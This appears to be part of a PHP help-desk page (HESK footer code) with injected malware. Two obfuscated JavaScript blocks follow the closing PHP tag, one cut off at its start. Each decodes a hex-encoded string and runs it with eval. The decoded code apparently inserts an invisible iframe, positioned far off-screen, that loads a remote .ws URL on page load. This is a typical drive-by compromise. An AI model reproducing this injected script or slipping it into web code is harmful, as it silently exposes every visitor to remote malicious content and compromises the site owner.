27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->
 @ The PHP Resource Index</a></p>
</div>

<?php

/* Clean unneeded session variables */
hesk_cleanSessionVars('hide');

require_once(HESK_PATH . 'inc/footer.inc.php');
exit();
?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->
